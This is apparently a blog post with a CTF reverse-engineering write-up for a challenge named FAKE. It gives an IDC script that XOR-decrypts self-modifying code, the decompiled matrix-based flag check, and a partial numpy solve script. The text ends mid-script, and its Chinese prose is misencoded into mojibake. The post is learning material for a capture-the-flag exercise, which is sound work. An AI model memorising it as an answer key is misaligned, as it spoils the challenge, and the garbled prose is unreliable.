    <content><![CDATA[<h2 id="WEEK3-RogerThat-WP"><a href="#WEEK3-RogerThat-WP" class="headerlink" title="WEEK3-RogerThat WP"></a>WEEK3-RogerThat WP</h2><p>èäº†èäº†ï¼Œæ²¡æ—¶é—´åšpwnäº†(æ¸¸æˆç©å¤šäº†)</p>
<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h4 id="FAKE"><a href="#FAKE" class="headerlink" title="FAKE"></a>FAKE</h4><p>ä¹±æ‰“ä¸€é€šï¼Œæ‹¿äº†ä¸€ä¸ªå‡flag,æ²¡æ³¨æ„åˆ°initå‡½æ•°å¯¹è°ƒè¯•å™¨æ“ä½œäº†ä¸€æ³¢ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/QQ%E6%88%AA%E5%9B%BE20210214025343.jpg" alt="QQæˆªå›¾20210214025343"></p>
<p>è¿™é‡Œåº”è¯¥æ˜¯æ£€æµ‹äº†æ˜¯å¦æœ‰debuggerï¼Œé€šè¿‡æ–‡ä»¶ç³»ç»Ÿæ¥è¾¾æˆï¼Œåœ¨windowsä¸­ä¼°è®¡å°±æ˜¯IsDebuggeräº†ï¼Œä¹Ÿå¯èƒ½æœ‰åˆ«çš„éªšæ“ä½œï¼Œæš‚ä¸”æ²¡è§ç€ï¼Œå¤§èƒ†çŒœæµ‹å¯ä»¥æœ‰å¤šè¿›ç¨‹é€šä¿¡æ£€æµ‹ä»€ä¹ˆçš„ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/FAKE2.jpg" alt="2"></p>
<p>é’ˆå¯¹è¿™ä¸ªæ¯”è¾ƒç®€å•çš„åŠ å¯†å‡½æ•°æœ‰è„šæœ¬</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;idc.idc></span></span>

<span class="token keyword">static</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">auto</span> addr <span class="token operator">=</span> <span class="token number">0x401216</span><span class="token punctuation">;</span>
    <span class="token keyword">auto</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">0x43E</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">PatchByte</span><span class="token punctuation">(</span>addr<span class="token operator">+</span>i<span class="token punctuation">,</span><span class="token function">Byte</span><span class="token punctuation">(</span>addr<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">Byte</span><span class="token punctuation">(</span><span class="token number">0x409080</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>è§£å¯†åå¾—åˆ°çœŸæ­£çš„æ¯”è¾ƒå‡½æ•°</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">sub_401216</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> v2<span class="token punctuation">[</span><span class="token number">36</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-1D0h]</span>
  <span class="token keyword">int</span> v3<span class="token punctuation">[</span><span class="token number">36</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+98h] [rbp-140h]</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">[</span><span class="token number">38</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+128h] [rbp-B0h] BYREF</span>
  <span class="token keyword">int</span> m<span class="token punctuation">;</span> <span class="token comment">// [rsp+1C0h] [rbp-18h]</span>
  <span class="token keyword">int</span> l<span class="token punctuation">;</span> <span class="token comment">// [rsp+1C4h] [rbp-14h]</span>
  <span class="token keyword">int</span> k<span class="token punctuation">;</span> <span class="token comment">// [rsp+1C8h] [rbp-10h]</span>
  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+1CCh] [rbp-Ch]</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+1D0h] [rbp-8h]</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment">// [rsp+1D4h] [rbp-4h]</span>

  <span class="token function">memset</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x90uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">55030</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">61095</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">60151</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">57247</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">56780</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">55726</span><span class="token punctuation">;</span>
  v3<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">46642</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">52931</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">53580</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">50437</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">50062</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">44186</span><span class="token punctuation">;</span>
  v3<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">44909</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">46490</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">46024</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">44347</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">43850</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">44368</span><span class="token punctuation">;</span>
  v3<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">54990</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">61884</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">61202</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">58139</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">57730</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">54964</span><span class="token punctuation">;</span>
  v3<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">48849</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">51026</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">49629</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">48219</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">47904</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">50823</span><span class="token punctuation">;</span>
  v3<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">46596</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">50517</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">48421</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">46143</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">46102</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">46744</span><span class="token punctuation">;</span>
  v2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">104</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">103</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">97</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">109</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">101</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>
  v2<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">64</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">95</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">70</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">65</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">75</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">69</span><span class="token punctuation">;</span>
  v2<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">95</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">102</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">108</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">97</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">103</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">33</span><span class="token punctuation">;</span>
  v2<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">45</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">111</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">95</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">89</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">48</span><span class="token punctuation">;</span>
  v2<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">117</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">95</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">107</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">111</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">110</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">119</span><span class="token punctuation">;</span>
  v2<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">95</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">83</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">77</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">67</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">63</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">125</span><span class="token punctuation">;</span>
  v10 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">for</span> <span class="token punctuation">(</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span>
        v4<span class="token punctuation">[</span><span class="token number">6</span> <span class="token operator">*</span> i <span class="token operator">+</span> j<span class="token punctuation">]</span> <span class="token operator">+=</span> v2<span class="token punctuation">[</span><span class="token number">6</span> <span class="token operator">*</span> k <span class="token operator">+</span> j<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">4LL</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">6</span> <span class="token operator">*</span> i <span class="token operator">+</span> k<span class="token punctuation">)</span> <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> l <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token operator">++</span>l <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span> m <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> m <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token operator">++</span>m <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> v4<span class="token punctuation">[</span><span class="token number">6</span> <span class="token operator">*</span> l <span class="token operator">+</span> m<span class="token punctuation">]</span> <span class="token operator">!=</span> v3<span class="token punctuation">[</span><span class="token number">6</span> <span class="token operator">*</span> l <span class="token operator">+</span> m<span class="token punctuation">]</span> <span class="token punctuation">)</span>
        v10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> v10<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>è€Œå‡çš„å‡½æ•°å´ä¹ŸåƒçœŸçš„ä¸€æ ·ï¼Œè¦æ˜¯è§£æä¸å‡ºæ¥æ•°æ®æ®µå˜›ï¼Œé‚£æˆ‘å€’æ˜¯ä¼šå…ˆå»æƒ³SMCï¼Œè¿™ç‚¹çœ‹çœŸçš„æ˜¯éå¸¸å·§å¦™ï¼ï¼ï¼åæ¥ä»”ç»†æƒ³äº†ä¸€ä¸‹ï¼Œåº”è¯¥æ˜¯encrypt(f1(x)) &#x3D;&#x3D; f2(2),åªè¦æ»¡è¶³èƒ½è½¬æ¢f1å’Œf2ï¼Œä»»ä½•åŠ å¯†æ–¹å¼éƒ½å¯ä»¥ã€‚è€Œå¼‚æˆ–æ°æ°æ˜¯æ¯”è¾ƒç®€å•æ–¹ä¾¿çš„åŠ å¯†æ–¹å¼ã€‚</p>
<p>åŸºæœ¬æ˜¯åŒä¸€ç©¿ä»£ç ï¼Œå¼‚æˆ–ä»¥ä¸‹ï¼ˆåŠ å¯†ä»¥ä¸‹ï¼‰èƒ½æ€§æˆä¸€ç§çœ‹ä¼¼å¾ˆåƒçœŸä»£ç çš„ä»£ç ã€‚</p>
<p>æœ€åç»è¿‡ä¸€äº›æ¢ç´¢ï¼Œå‘ç°æ˜¯ä¸€ä¸ªçº¿æ€§çš„åŠ å¯†ï¼ŒçŸ©é˜µä¹˜æ³•ã€‚å› æ­¤å¾—åˆ°è§£å¯†è„šæœ¬</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np

v2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">36</span>
v3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">36</span>

v3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">55030</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">61095</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">60151</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">57247</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">56780</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">55726</span><span class="token punctuation">;</span>
v3<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">46642</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">52931</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">53580</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">50437</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">50062</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">44186</span><span class="token punctuation">;</span>
v3<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">44909</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">46490</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">46024</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">44347</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">43850</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">44368</span><span class="token punctuation">;</span>
v3<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">54990</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">61884</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">61202</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">58139</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">57730</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">54964</span><span class="token punctuation">;</span>
v3<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">48849</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">51026</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">49629</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">48219</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">47904</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">50823</span><span class="token punctuation">;</span>
v3<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">46596</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">50517</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">48421</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">46143</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">46102</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">46744</span><span class="token punctuation">;</span>
v2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">104</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">103</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">97</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">109</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">101</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>
v2<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">64</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">95</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">70</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">65</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">75</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">69</span><span class="token punctuation">;</span>
v2<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">95</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">102</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">108</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">97</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">103</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">33</span><span class="token punctuation">;</span>
